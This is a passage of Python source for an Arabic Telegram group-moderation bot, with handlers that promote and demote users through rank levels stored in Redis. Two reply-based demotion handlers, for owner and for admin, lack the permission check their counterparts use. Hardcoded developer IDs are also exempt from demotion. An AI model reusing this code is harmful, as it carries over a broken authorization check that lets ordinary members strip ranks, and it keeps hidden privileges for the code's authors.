            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
    
    if text == 'رفع مالك' and m.reply_to_message and m.reply_to_message.from_user:
        if not gowner_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المالك الاساسي ) بس')
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مالك من قبل\n☆')
        else:
          r.set(f'{cid}:rankOWNER:{id}{Dev_Zaid}', 1)
          r.sadd(f'{cid}:listOWNER:{Dev_Zaid}', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار مالك\n☆')
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
    
    
    if text.startswith('رفع مدير '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return
        if not owner_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس')
        if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')           
        if r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مدير من قبل\n☆')
        else:
          r.set(f'{cid}:rankMOD:{id}{Dev_Zaid}', 1)
          r.sadd(f'{cid}:listMOD:{Dev_Zaid}', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار مدير\n☆')
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
    
    if text == 'رفع مدير' and m.reply_to_message and m.reply_to_message.from_user:
        if not owner_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')           
        if r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مدير من قبل\n☆')
        else:
          r.set(f'{cid}:rankMOD:{id}{Dev_Zaid}', 1)
          r.sadd(f'{cid}:listMOD:{Dev_Zaid}', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار مدير\n☆')
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
    
    if text.startswith('رفع ادمن '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return
        if not mod_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( المدير وفوق ) بس')
        if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
           
        if r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} ادمن من قبل\n☆')
        else:
          r.set(f'{cid}:rankADMIN:{id}{Dev_Zaid}', 1)
          r.sadd(f'{cid}:listADMIN:{Dev_Zaid}', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار ادمن\n☆')
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
    
    if text == 'رفع ادمن' and m.reply_to_message and m.reply_to_message.from_user:        
        if not mod_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( المدير وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
           
        if r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} ادمن من قبل\n☆')
        else:
          r.set(f'{cid}:rankADMIN:{id}{Dev_Zaid}', 1)
          r.sadd(f'{cid}:listADMIN:{Dev_Zaid}', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار ادمن\n☆')
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
    
    if text.startswith('رفع مميز '):
      if not '@' in text and not re.findall('[0-9]+', text):
          return
      if not admin_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
      else:
        if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if r.get(f'{cid}:rankPRE:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مميز من قبل\n☆')
        else:
          r.set(f'{cid}:rankPRE:{id}{Dev_Zaid}', 1)
          r.sadd(f'{cid}:listPRE:{Dev_Zaid}', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار مميز\n☆')
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
    
    if text == 'رفع مميز' and m.reply_to_message and m.reply_to_message.from_user:
      if not admin_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
      else:
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف ارفع نفسي')
        if id == m.from_user.id:
           return m.reply(f'{k} هطف تبي ترفع نفسك؟')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if r.get(f'{cid}:rankPRE:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مميز من قبل\n☆')
        else:
          r.set(f'{cid}:rankPRE:{id}{Dev_Zaid}', 1)
          r.sadd(f'{cid}:listPRE:{Dev_Zaid}', id)
          m.reply(f'{k} الحلو 「 {mention} 」\n{k} رفعته صار مميز\n☆')
          if r.get(f'{id}:mute:{m.chat.id}{Dev_Zaid}'):
            r.delete(f'{id}:mute:{m.chat.id}{Dev_Zaid}')
            r.srem(f'{m.chat.id}:listMUTE:{Dev_Zaid}', id)
          
    
    
    
@Client.on_message(filters.text & filters.group, group=8)
def ranksCommandsHandlerDemote(c,m):
   k = r.get(f'{Dev_Zaid}:botkey')
   ranks_reply_demote(c,m,k)


def ranks_reply_demote(c,m,k):
    if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):  return
    if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return 
    if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
    if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
    if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
    if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
    if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
    text = m.text
    name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
    if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
    if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
    if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
    if isLockCommand(m.from_user.id, m.chat.id, text): return
    rank = get_rank(m.from_user.id, m.chat.id)
    cid = m.chat.id
    
    if text == 'تنزيل Dev' and m.reply_to_message and m.reply_to_message.from_user:
        if not devp_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( Dev🎖️) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention     
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')           
        if not r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو Dev²🎖\n☆')
        else:
          r.delete(f'{id}:rankDEV2:{Dev_Zaid}')
          r.srem(f'{Dev_Zaid}DEV2', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من Dev²🎖\n☆')
    
    if text.startswith('تنزيل Dev '):
      if not '@' in text and not re.findall('[0-9]+', text):
          return
      if not devp_pls(m.from_user.id,m.chat.id):
        return m.reply(f'{k} هذا الامر يخص ( Dev🎖️) بس')
      else:
        if len(text.split()) == 4:
           user = text.split()[3]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')           
        if not r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو Dev²🎖\n☆')
        else:
          r.delete(f'{id}:rankDEV2:{Dev_Zaid}')
          r.srem(f'{Dev_Zaid}DEV2', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من Dev²🎖\n☆')
          
    if text == 'تنزيل MY'  and m.reply_to_message and m.reply_to_message.from_user:
        if not dev2_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( Dev²🎖️ وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')           
        if not r.get(f'{id}:rankDEV:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو Myth🎖️ من قبل\n☆')
        else:
          r.delete(f'{id}:rankDEV:{Dev_Zaid}')
          r.srem(f'{Dev_Zaid}DEV', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من Myth🎖️\n☆')
    
    if text.startswith('تنزيل MY '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return
        if not dev2_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( Dev²🎖️ وفوق ) بس')
        if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
           
        if not r.get(f'{id}:rankDEV:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو Myth🎖️ من قبل\n☆')
        else:
          r.delete(f'{id}:rankDEV:{Dev_Zaid}')
          r.srem(f'{Dev_Zaid}DEV', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من Myth🎖️\n☆')
    
    
    
    if text == 'تنزيل مالك اساسي' and m.reply_to_message and m.reply_to_message.from_user:
        if not gowner_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص (المالك الاساسي وفوق) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
        if not r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مالك اساسي\n☆')
        else:
          r.delete(f'{cid}:rankGOWNER:{id}{Dev_Zaid}')
          r.srem(f'{cid}:listGOWNER:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من المالك الاساسي\n☆')
    
    if text.startswith('تنزيل مالك اساسي '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return
        if not gowner_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص (المالك الاساسي وفوق) بس')
        if len(text.split()) == 4:
           user = text.split()[3]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''
        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
        if not r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مالك اساسي\n☆')
        else:
          r.delete(f'{cid}:rankGOWNER:{id}{Dev_Zaid}')
          r.srem(f'{cid}:listGOWNER:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من المالك الاساسي\n☆')
    
    
    if text.startswith('تنزيل مالك '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return
        if not gowner_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( المالك الاساسي ) بس')
        if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')        
        '''
        if m.reply_to_message and m.reply_to_message.from_user:
           id = m.reply_to_message.from_user.id
           mention = m.reply_to_message.from_user.mention
        '''        
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')        
        if not r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مالك من قبل\n☆')
        else:
          r.delete(f'{cid}:rankOWNER:{id}{Dev_Zaid}')
          r.srem(f'{cid}:listOWNER:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من المالك \n☆')
    
    if text == 'تنزيل مالك' and m.reply_to_message and m.reply_to_message.from_user:    
        
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention     
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')        
        if not r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مالك من قبل\n☆')
        else:
          r.delete(f'{cid}:rankOWNER:{id}{Dev_Zaid}')
          r.srem(f'{cid}:listOWNER:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من المالك \n☆')

    if text.startswith('تنزيل مدير '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return 
        if not owner_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس')
        if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
           
        if not r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مدير من قبل\n☆')
        else:
          r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
          r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من رتبة المدير \n☆')
    
    if text == 'تنزيل مدير' and m.reply_to_message and m.reply_to_message.from_user:
        if not owner_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المالك وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
        
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
           
        if not r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مدير من قبل\n☆')
        else:
          r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
          r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من رتبة المدير \n☆')
    
    if text.startswith('تنزيل ادمن '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return 
        if not mod_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المدير وفوق ) بس')
        if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if not r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو ادمن من قبل\n☆')
        else:
          r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
          r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من رتبة الادمن \n☆')
    
    if text == 'تنزيل ادمن' and m.reply_to_message and m.reply_to_message.from_user:
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if not r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو ادمن من قبل\n☆')
        else:
          r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
          r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من رتبة الادمن \n☆')
    
    if text.startswith('تنزيل مميز '):
        if not '@' in text and not re.findall('[0-9]+', text):
          return 
        if not admin_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
        if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
        
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if not r.get(f'{cid}:rankPRE:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مميز من قبل\n☆')
        else:
          r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
          r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من المميزين \n☆')
    
    if text == 'تنزيل مميز' and m.reply_to_message and m.reply_to_message.from_user:
        if not admin_pls(m.from_user.id,m.chat.id):
           return m.reply(f'{k} هذا الامر يخص ( الادمن وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
        if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
        if not r.get(f'{cid}:rankPRE:{id}{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو مميز من قبل\n☆')
        else:
          r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
          r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} نزلته من المميزين \n☆')
    
    if text.startswith('تنزيل الكل '):
       if not '@' in text and not re.findall('[0-9]+', text):
          return 
       if not mod_pls(m.from_user.id,m.chat.id):
          return m.reply(f'{k} هذا الامر يخص ( المدير وفوق ) بس')
       
       if len(text.split()) == 3:
           user = text.split()[2]
           if user.startswith('@'):
              try:
                 get = c.get_chat(user)
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا اليوزر')
           else:
              try:
                 get = c.get_chat(int(user))
                 mention = f'[{get.first_name}](tg://user?id={get.id})'
                 id = get.id
              except:
                 return m.reply(f'{k} مافيه عضو بهذا الآيدي')
       
       if rank == get_rank(id, cid):
           return m.reply('نفس رتبتك ترا')
       if id == int(Dev_Zaid):
           return m.reply('ركز حبيبي كيف انزل نفسي')
       if devp_pls(m.from_user.id,m.chat.id):
          rank = get_rank(id,cid)
          if id == m.from_user.id:
             return m.reply(f'{k} مافيك تنزل نفسك')
          if not rank == 'عضو' and not id in [6168217372]:
              m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
              r.delete(f'{id}:rankDEV2:{Dev_Zaid}')
              r.srem(f'{Dev_Zaid}DEV2', id)
              r.delete(f'{id}:rankDEV:{Dev_Zaid}')
              r.srem(f'{Dev_Zaid}DEV', id)
              r.delete(f'{cid}:rankGOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listGOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
              return
          if id in [6168217372, 5117901887]:
              return m.reply(f'{k} مايمديك تستخدم الأمر على مبرمج السورس')
          else:
              return m.reply(f'{k} ماله رتبة')
       
       if dev2_pls(m.from_user.id, m.chat.id):
          rank = get_rank(id,cid)
          if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [6168217372]:
              m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
              r.delete(f'{id}:rankDEV:{Dev_Zaid}')
              r.srem(f'{Dev_Zaid}DEV', id)
              r.delete(f'{cid}:rankGOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listGOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankOWNER:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listOWNER:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
              r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
              r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
              return
          if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')):
              return m.reply(f'{k} رتبته اعلى منك')
          else:
              return m.reply(f'{k} ماله رتبة')

       if not rank == 'عضو' and not id == int(r.get(f'{Dev_Zaid}botowner')) and not id in [6168217372] and not r.get(
               f'{id}:rankDEV2:{Dev_Zaid}'):
           m.reply(f'「 {mention} 」\n{k} نزلته من {rank} \n☆')
           r.delete(f'{cid}:rankGOWNER:{id}{Dev_Zaid}')
           r.srem(f'{cid}:listGOWNER:{Dev_Zaid}', id)
           r.delete(f'{cid}:rankOWNER:{id}{Dev_Zaid}')
           r.srem(f'{cid}:listOWNER:{Dev_Zaid}', id)
           r.delete(f'{cid}:rankMOD:{id}{Dev_Zaid}')
           r.srem(f'{cid}:listMOD:{Dev_Zaid}', id)
           r.delete(f'{cid}:rankADMIN:{id}{Dev_Zaid}')
           r.srem(f'{cid}:listADMIN:{Dev_Zaid}', id)
           r.delete(f'{cid}:rankPRE:{id}{Dev_Zaid}')
           r.srem(f'{cid}:listPRE:{Dev_Zaid}', id)
           return
       if id in [6168217372, 5117901887] or id == int(r.get(f'{Dev_Zaid}botowner')) or not r.get(
               f'{id}:rankDEV2:{Dev_Zaid}'):
           return m.reply(f'{k} رتبته اعلى منك')
       else:
           return m.reply(f'{k} ماله رتبة')
       
       if gowner_pls(m.from_user.id, m.chat.id):
